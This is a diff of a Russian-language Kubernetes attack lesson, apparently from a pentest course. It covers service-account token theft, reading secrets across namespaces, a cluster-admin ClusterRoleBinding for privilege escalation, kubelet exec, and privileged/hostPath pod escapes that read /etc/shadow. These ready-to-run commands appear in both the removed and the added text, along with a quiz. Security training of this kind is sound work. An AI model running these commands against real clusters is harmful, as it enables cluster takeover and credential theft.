@@ -15,265 +15,160 @@ estimated_minutes: 55
 summary: "Kubernetes — control plane облачных ворклоадов. Разбираем API server, kubeconfig, RBAC, service-account токены, аудит прав и классические атаки: privileged pod, hostPath, кража секретов и побег на ноду."
 ---
 
-Kubernetes — это «ОС облачных ворклоадов»: если вы попали внутрь пода, вы уже внутри кластера, и часто до администратора — один слабый RBAC или одна привилегированная конфигурация. Урок практический: от первого токена service account до побега на ноду.
+## Задача
 
-## Архитектура: что где лежит
+В прошлом уроке мы вышли из пода на ноду. Но часто нода — не цель, а промежуточная станция: настоящая власть в Kubernetes лежит в **API-сервере** — единой точке управления кластером. Ты попал в под, у тебя есть токен, но ты не админ. Вопрос урока: **как из «рядового» пода понять свои права и дорасти до cluster-admin**, используя только RBAC.
 
-Минимальная модель, которую надо держать в голове:
+## Данные, с которыми работаем
 
-- **API server** (`:6443`) — единая точка управления; всё общение через него.
-- **etcd** (`:2379`) — хранилище состояния и секретов.
-- **kubelet** (`:10250`) — агент на каждой ноде, умеет `exec` в поды.
-- **Поды** — запускают контейнеры; у каждого — смонтированный **service-account токен**.
-
-Внутри пода токен лежит по пути:
+Наш объект — под `web-7f9c-abc`, в который мы зашли через RCE в приложении. Внутри любого пода Kubernetes лежит **service account token** — токен «сервисной учётки» пода, по которому кластер понимает, кто ты и что тебе можно. Он смонтирован по стандартному пути:
 
 ```bash
-/var/run/secrets/kubernetes.io/serviceaccount/token
-/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-/var/run/secrets/kubernetes.io/serviceaccount/namespace
+$ ls /var/run/secrets/kubernetes.io/serviceaccount/
+ca.crt  namespace  token
+$ cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+default
 ```
 
-## Разведка: что я могу
-
-Первое, что делает атакующий внутри пода — узнаёт свой токен и права:
+Токен — это JWT, длинная строка. Он аутентифицирует нас перед API-сервером. Сам API-сервер доступен внутри кластера по DNS-имени `kubernetes.default.svc`. Сразу сохраняем всё в переменные:
 
 ```bash
-# Токен и namespace
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
-APISERVER=https://kubernetes.default.svc
-
-# Кто я
-curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
-  -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/api/v1/namespaces/$NS/pods
-
-# Проверка прав (self-subject access review)
-kubectl auth can-i --list
-kubectl auth can-i create pods
-kubectl auth can-i get secrets --all-namespaces
+$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+$ NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+$ APISERVER=https://kubernetes.default.svc
 ```
 
-Если `kubectl` не установлен, есть `kubeconfig` — он может быть в `~/.kube/config` или в переменной `KUBECONFIG`. Проверяйте домашние каталоги и env-переменные подов.
+## Пробуем в лоб: кто я и что могу
 
-## RBAC: как читать и злоупотреблять
+**RBAC** (Role-Based Access Control) — механизм прав Kubernetes: он связывает субъекта (User/Group/ServiceAccount) с ролью, а роль — с правилами «verb × resource». Нам важно не выучить всю систему, а узнать **свои** права.
 
-RBAC связывает **субъект** (User/Group/ServiceAccount) → **роль** (Role/ClusterRole) → **правила** (verbs × resources). Ключевые опасные права:
-
-| Право | Почему опасно |
-|-------|---------------|
-| `create pods` | Можно запустить привилегированный под → побег |
-| `create pods/exec` | `kubectl exec` в чужой под = RCE |
-| `get secrets` | Токены SA, пароли, ключи других сервисов |
-| `create clusterrolebindings` | Выдать себе cluster-admin |
-| `impersonate` | Действовать как другой субъект |
-| `create pods/portforward` | Доступ к внутренним сервисам |
-| `get nodes/proxy` | Прямой доступ к kubelet → exec |
+Если в поде есть `kubectl`, это одна команда:
 
 ```bash
-# Список ролей и биндингов
-kubectl get clusterrolebindings -o wide
-kubectl get rolebindings -A
-kubectl describe clusterrole cluster-admin
-
-# Что разрешено моему SA (по имени)
-kubectl get clusterrolebinding -o json | jq -r '
-  .items[] | select(.subjects[]?.name=="<sa-name>") | .roleRef.name'
+$ kubectl auth can-i --list
+Resources                                       Non-Resource URLs   Resource Names   Verbs
+pods                                            []                  []               [get list]
+pods/exec                                       []                  []               [create]
+secrets                                         []                  []               [get]
+...
 ```
 
-Частая ошибка конфигурации — **ClusterRole с `resources: ["*"]` и `verbs: ["*"]`**, забинденный на default SA в namespace.
-
-## Кража секретов
-
-Секреты — топ-цель. В старых кластерах они лежали как `Secret`-объекты; в новых — как projected volume. Достать секрет:
+Читается так: нам можно `get/list` поды, `create` в `pods/exec` (то есть делать `kubectl exec` в поды — выполнять в них команды) и `get` секреты. Прав на создание подов пока не видно — проверим отдельные:
 
 ```bash
-# Список секретов
-kubectl get secrets -A
-# Прямое чтение (base64)
-kubectl get secret <name> -o jsonpath='{.data}' | jq -r 'to_entries[] |
-  "\(.key)=\(.value|@base64d)"'
-
-# Все секреты всех namespace одним махом (если есть права)
-kubectl get secrets -A -o json | jq -r '
-  .items[] | .metadata.namespace + "/" + .metadata.name'
+$ kubectl auth can-i create pods
+no
+$ kubectl auth can-i get secrets --all-namespaces
+yes
 ```
 
-Кража токена SA другой (более привилегированной) сервисной учётки:
+Мы можем читать секреты **во всех** namespace. Это уже почти победа: секреты кластера — это токены других service account'ов, пароли БД, ключи. Смотрим, что есть:
 
 ```bash
-# Создать под, монтирующий чужой SA
-kubectl run steal --image=alpine --restart=Never \
-  --overrides='{"spec":{"serviceAccountName":"<high-priv-sa>"}}' \
-  --command -- sleep 3600
-kubectl exec -it steal -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+$ kubectl get secrets -A
+NAMESPACE     NAME                  TYPE
+default       app-db                Opaque
+kube-system   ci-deployer-token     kubernetes.io/service-account-token
 ```
 
-## Побег из пода на ноду
+Секрет `ci-deployer-token` — токен service account `ci-deployer`. Если у него прав больше, чем у нас, мы можем **примерить его личность**.
 
-Побег возможен при слабых настройках. Основные векторы:
+## Шаг 2: читаем чужой токен и повышаем права
 
-1. **privileged pod** — полный доступ к устройствам и хосту.
-2. **hostPath** — монтирование `/` ноды внутрь пода.
-3. **hostPID/hostNetwork** — видеть процессы/сеть хоста.
-4. **docker.sock внутри пода** — управление Docker демоном.
-5. **capabilities** (`SYS_ADMIN`, `SYS_PTRACE`) — обход изоляции.
+Токен из секрета — это base64. Достаём его напрямую из объекта:
 
 ```bash
-# Привилегированный под с монтированием корня ноды
-cat <<'YAML' | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: escape
-spec:
-  hostPID: true
-  containers:
-  - name: c
-    image: alpine
-    command: ["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","/bin/sh","-c","id; cat /etc/shadow"]
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - name: host
-      mountPath: /host
-  volumes:
-  - name: host
-    hostPath:
-      path: /
-YAML
-
-# Если внутри пода смонтирован docker.sock:
-docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host
+$ kubectl get secret ci-deployer-token -n kube-system -o jsonpath='{.data.token}' | base64 -d
+eyJhbGciOiJSUzI1NiIsImtpZCI6...
 ```
 
-Классика через `hostPath` без `nsenter`:
+Теперь проверяем, что умеет `ci-deployer`:
 
 ```bash
-kubectl run h --image=alpine --restart=Never \
-  --overrides='{"spec":{"volumes":[{"name":"r","hostPath":{"path":"/"}}],
-  "containers":[{"name":"h","image":"alpine","volumeMounts":[{"name":"r","mountPath":"/h"}],
-  "command":["sleep","3600"]}]}}'
-kubectl exec -it h -- chroot /h /bin/sh
+$ kubectl auth can-i --list --token="$TOKEN2"
+Resources       ...   Verbs
+clusterrolebindings ... [create]
+pods            ...   [create]
+secrets         ...   [get list]
 ```
 
-## kubelet и node-level доступ
-
-Даже без прав на API можно добраться до **kubelet** на ноде (`:10250`), если он доступен:
+Строка `clusterrolebindings ... [create]` — это ключ. Право **создавать clusterrolebindings** означает: можно привязать любую роль, включая `cluster-admin`, к кому угодно — в том числе к себе. `ClusterRoleBinding` — глобальная привязка роли к субъекту.
 
 ```bash
-# Проверить kubelet API (нужен клиентский сертификат или аноним)
-curl -sk https://<node-ip>:10250/pods
-# Через kubelet exec (если разрешено)
-curl -sk https://<node-ip>:10250/run/<ns>/<pod>/<container> -d 'cmd=id'
+$ kubectl --token="$TOKEN2" create clusterrolebinding pwn \
+    --clusterrole=cluster-admin \
+    --serviceaccount=kube-system:ci-deployer
+clusterrolebinding.rbac.authorization.k8s.io/pwn created
 ```
 
-Право `nodes/proxy` даёт доступ к kubelet через API server:
+Одна команда — и `ci-deployer` теперь cluster-admin. Проверяем:
 
 ```bash
-kubectl get --raw "/api/v1/nodes/<node>/proxy/pods"
-kubectl get --raw "/api/v1/nodes/<node>/proxy/run/<ns>/<pod>/<container>" --method POST -f -
+$ kubectl --token="$TOKEN2" auth can-i '*' '*' --all-namespaces
+yes
 ```
 
-## Разобранный пример: от SA до cluster-admin
+Мы администратор кластера. Дальше — все секреты всех namespace, создание любых подов (в том числе привилегированных — см. прошлый урок), доступ к нодам.
 
-**Дано:** под с SA `default`, задача — стать админом.
+## Полный прогон от начала до конца
 
-1. Читаем токен, `kubectl auth can-i --list` → видим `create pods` в своём namespace.
-2. Создаём привилегированный под (см. выше) → побег на ноду.
-3. На ноде ищем `/etc/kubernetes/admin.conf` или `/var/lib/kubelet/kubeconfig` — часто содержит cluster-admin.
+1. Зашли в под, забрали SA-токен из `/var/run/secrets/.../token`.
+2. `auth can-i --list` → нашли `get secrets`.
+3. `get secrets -A` → нашли токен `ci-deployer` в `kube-system`.
+4. Проверили права `ci-deployer` → есть `create clusterrolebindings`.
+5. Привязали `cluster-admin` к `ci-deployer` → стали админом.
+6. Прочитали все секреты и убедились в полном контроле.
+
+Путь от «случайного пода» до «владельца кластера» — четыре команды, и ни одного эксплойта. Слабый RBAC опасен именно этим.
+
+## Если не сработало: другие опасные права
+
+Не обязательно `clusterrolebindings`. Вот на что смотреть в выводе `can-i --list`:
+
+| Право | Что даёт |
+|-------|----------|
+| `create pods` | запустить привилегированный под → побег на ноду |
+| `create pods/exec` | `exec` в чужой под = выполнение команд |
+| `get secrets` | токены SA, пароли, ключи |
+| `create clusterrolebindings` | выдать себе `cluster-admin` |
+| `impersonate` | действовать от имени другого субъекта |
+| `nodes/proxy` | прокси к kubelet → `exec` на ноде |
+
+**kubelet** (`:10250`) — агент на каждой ноде. Если через `nodes/proxy` или напрямую дотянуться до него, можно выполнять команды в подах мимо API-сервера:
 
 ```bash
-find / -name "*.kubeconfig" -o -name "admin.conf" 2>/dev/null
-export KUBECONFIG=/etc/kubernetes/admin.conf
-kubectl get nodes          # проверка: мы админ
+$ kubectl get --raw "/api/v1/nodes/node-prod-01/proxy/pods"
+{"kind":"PodList", ...}
 ```
 
-4. Альтернативно — если есть `create clusterrolebindings`, биндим `cluster-admin` на свой SA:
+Если RBAC закрыт, а `kubectl` не установлен — ищи **kubeconfig** в файловой системе (`~/.kube/config`, `$KUBECONFIG`, `/etc/kubernetes/admin.conf`). Часто он содержит `cluster-admin`.
 
-```bash
-kubectl create clusterrolebinding pwn --clusterrole=cluster-admin \
-  --serviceaccount=$NS:default
-```
+## Частые ошибки и подводные камни
 
-## Частые ошибки
+- **Считать, что без `kubeconfig` доступа нет.** SA-токен пода сам по себе аутентифицирует нас перед API-сервером — `kubectl` не обязателен, REST-запрос с `Authorization: Bearer` работает так же.
+- **Проверять только свой namespace.** Права и секреты часто лежат в `kube-system`; флаг `--all-namespaces` в `auth can-i` показывает реальную картину.
+- **Считать SA-токен статичным.** В кластерах с проекцией токен живёт около часа — надо успеть воспользоваться им до истечения.
+- **Путать `get` и `list`.** `list secrets` и `get secret` — разные права; иногда есть только одно из них, и это меняет тактику.
+- **Забывать про `impersonate`.** Право действовать от имени другого субъекта позволяет «примерить» более привилегированный SA без кражи его токена.
 
-- **Игнорировать `auth can-i --list`.** Это первое, что надо сделать; часто сразу видно путь.
-- **Забыть про другие namespace.** Права и секреты могут быть в `kube-system`.
-- **Считать токен SA статичным.** В новых кластерах это projected token с TTL (по умолчанию ~1 час) — надо успеть.
-- **Пробовать побег без проверки `securityContext`.** Без privileged/hostPath/CAP_SYS_ADMIN побег не сработает.
-- **Не смотреть kubelet.** Иногда API закрыт, а `:10250` — открыт.
-- **Забывать про аудит.** K8s audit log фиксирует `exec`, создание подов и доступ к секретам.
+## Что мы теперь знаем
 
-## Что дальше / решение
+- В каждом поде лежит SA-токен по пути `/var/run/secrets/kubernetes.io/serviceaccount/token`.
+- RBAC связывает субъект → роль → правила «verb × resource».
+- `kubectl auth can-i --list` — первая команда после входа: показывает свои права.
+- `get secrets` ведёт к чужим токенам; `create clusterrolebindings` — прямой путь в `cluster-admin`.
+- `nodes/proxy` и открытый kubelet (10250) обходят API-сервер.
+- В новых кластерах SA-токен — projected, с TTL около часа: надо успеть.
 
-- Есть `create pods` → пробуйте privileged/hostPath escape.
-- Есть `get secrets` → собирайте токены и креды, ищите более привилегированные SA.
-- Есть `nodes/proxy` или открытый kubelet → идите на ноду.
-- Ничего нет → ищите kubeconfig в файловой системе, env и монтированиях.
+## На что смотреть дальше
 
-Смежные уроки: `cloud-kubernetes-escape`, `cloud-k8s-secrets`, `cloud-docker-socket`, `cloud-k8s-admission`.
-
-## Архитектура: что где лежит
-
-Control plane (API server, etcd, controller-manager, scheduler) и nodes (kubelet, kube-proxy, runtime). Секреты — в etcd; SA-токены — в подах; kubelet — на ноде (10250). Понимание этого определяет путь от пода к кластеру и облаку.
-
-## Разведка: что я могу
-
-```bash
-kubectl auth can-i --list
-kubectl auth can-i get secrets
-kubectl auth can-i create pods
-kubectl get sa,role,rolebinding,clusterrole,clusterrolebinding -A
-kubectl get secrets -A
-```
-
-## RBAC: как читать и злоупотреблять
-
-`Role`/`RoleBinding` — в namespace, `ClusterRole`/`ClusterRoleBinding` — глобально. Опасные права: `get/list secrets`, `create pods`, `create clusterrolebindings`, `escalate`, `bind`, `impersonate`. С `create pods` в namespace с hostPath/privileged — побег. С `escalate`/`bind` — выдать себе cluster-admin.
-
-## Кража секретов
-
-```bash
-kubectl get secret db -o jsonpath='{.data.password}' | base64 -d
-# SA-токен из пода
-cat /var/run/secrets/kubernetes.io/serviceaccount/token
-```
-
-## Побег из пода на ноду
-
-```bash
-kubectl run pwn --image=alpine --restart=Never --overrides='{"spec":{
- "containers":[{"name":"p","image":"alpine","command":["sh","-c","sleep 1d"],
- "volumeMounts":[{"name":"h","mountPath":"/host"}]}],
- "volumes":[{"name":"h","hostPath":{"path":"/"}}]}}'
-kubectl exec -it pwn -- chroot /host sh
-```
-
-## kubelet и node-level доступ
-
-```bash
-curl -k https://NODE:10250/pods -H "Authorization: Bearer $TOKEN"
-curl -k https://NODE:10250/run/ns/pod/container -d "cmd=id" -H "Authorization: Bearer $TOKEN"
-```
-
-## Разобранный пример: от SA до cluster-admin
-
-1. Из пода читаем SA-токен.
-2. `can-i --list` показывает `create clusterrolebindings` или `escalate`.
-3. Создаём ClusterRoleBinding себя (SA) к `cluster-admin`.
-4. Проверяем: `kubectl auth can-i '*' '*' --all-namespaces`.
-5. Теперь читаем все секреты и управляем кластером.
-
-## Частые ошибки
-
-- Считать, что без kubeconfig нет доступа (SA-токен работает).
-- Не проверять ClusterRoleBinding на `cluster-admin`.
-- Забывать про kubelet.
-- Не смотреть, есть ли право `impersonate`.
+- **k8s-secrets** и **etcd**: где на самом деле хранятся секреты кластера.
+- **k8s-admission**: admission-контроллеры, которые могут блокировать создание привилегированных подов.
+- **Pod Security Admission**: уровни restricted и как их обходить.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Где внутри пода лежит токен service account?"
@@ -283,7 +178,7 @@ curl -k https://NODE:10250/run/ns/pod/container -d "cmd=id" -H "Authorization: B
     - "/root/.kube/token"
     - "/proc/token"
   answer: 0
-  explanation: "Стандартный путь projected-токена SA."
+  explanation: "Это стандартный путь projected-токена SA."
 - question: "Какое RBAC-право позволяет читать чужие секреты?"
   options:
     - "get secrets"
@@ -292,14 +187,14 @@ curl -k https://NODE:10250/run/ns/pod/container -d "cmd=id" -H "Authorization: B
     - "create events"
   answer: 0
   explanation: "get secrets даёт доступ к объектам Secret."
-- question: "Что нужно в securityContext для побега через hostPath на корень ноды?"
+- question: "Почему право create clusterrolebindings критично?"
   options:
-    - "Монтирование hostPath / и, как правило, privileged"
-    - "Только imagePullPolicy Always"
-    - "restartPolicy Never"
-    - "nodeSelector"
+    - "Позволяет привязать cluster-admin к любому субъекту, включая себя"
+    - "Ускоряет планирование подов"
+    - "Шифрует секреты"
+    - "Только для чтения ролей"
   answer: 0
-  explanation: "hostPath на / плюс привилегии дают доступ к хосту."
+  explanation: "ClusterRoleBinding привязывает роль к субъекту глобально."
 - question: "Что такое kubelet и на каком порту он обычно слушает?"
   options:
     - "Агент ноды, порт 10250"
@@ -317,6 +212,10 @@ curl -k https://NODE:10250/run/ns/pod/container -d "cmd=id" -H "Authorization: B
   answer: 0
   explanation: "SelfSubjectAccessReview показывает разрешённые действия."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём, где кластер на самом деле хранит секреты — в `Secret`-объектах, в SA-токенах и в **etcd**. А пока главное запомни: **в Kubernetes власть даёт не эксплойт, а права**; `can-i --list` и один неосторожный `clusterrolebinding` весят больше, чем любая CVE.
 
 ## Где пригодится
 
